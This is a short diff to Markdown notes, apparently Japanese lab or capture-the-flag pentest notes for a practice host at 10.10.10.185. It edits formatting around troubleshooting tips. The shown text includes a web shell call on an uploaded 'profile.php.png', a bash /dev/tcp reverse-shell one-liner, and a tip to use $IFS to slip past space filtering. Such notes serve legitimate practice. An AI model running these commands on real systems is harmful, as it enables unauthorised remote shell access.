@@ -2118,12 +2118,14 @@ http://10.10.10.185/images/uploads/profile.php.png?cmd=python3%20-c%20%27import%
 
 - reverse shell がうまくいかない。
 
+```
 bash →  bash -c "bash -i >& /dev/tcp/ip/port 0>&1" とする。
 
 python →  python3 に変更する
+```
  
 - 半角が原因で、コマンドがうまく実行できない。
 
 $IFS 使う。
 
-![2BAC8726-A644-462A-B37B-81E78267247D](https://user-images.githubusercontent.com/39001773/136394070-436b8ab8-1a53-46a0-a6e7-38b3481c3245.png)
+<img src="https://user-images.githubusercontent.com/39001773/136394070-436b8ab8-1a53-46a0-a6e7-38b3481c3245.png" width=500 >
